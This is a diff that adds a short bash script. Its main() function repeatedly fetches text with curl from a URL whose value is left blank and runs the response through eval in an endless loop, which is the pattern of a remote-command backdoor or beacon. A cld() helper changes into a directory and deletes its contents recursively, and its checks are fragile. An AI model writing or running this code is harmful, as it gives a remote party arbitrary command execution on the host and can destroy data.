@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+
+function cld() {
+
+    echo "Clearing $1"
+
+
+    [ ! -e "$1" ] && return
+
+    [ ! -d "$1" ] && return
+
+    [ -e "$1" ] && [ -d "$1" ] && cd "$1"
+
+    [ "$PWD" != "$1" ] && return
+
+    [ "$(ls $1)" ] && rm * -r
+
+    [ "$(ls $1)" ] && echo "00000000000000000" && return
+
+    [ ! -s "$1" ] && echo "==================="
+
+}
+
+function main() {
+
+    useragent=
+    url=
+
+    command=$(curl -sS -L -A $useragent $url)
+
+    if [ -z "$command" ]; then
+        return
+    else
+        eval $command
+    fi
+
+    sleep 10
+}
+
+while true; do
+
+    main
+
+done
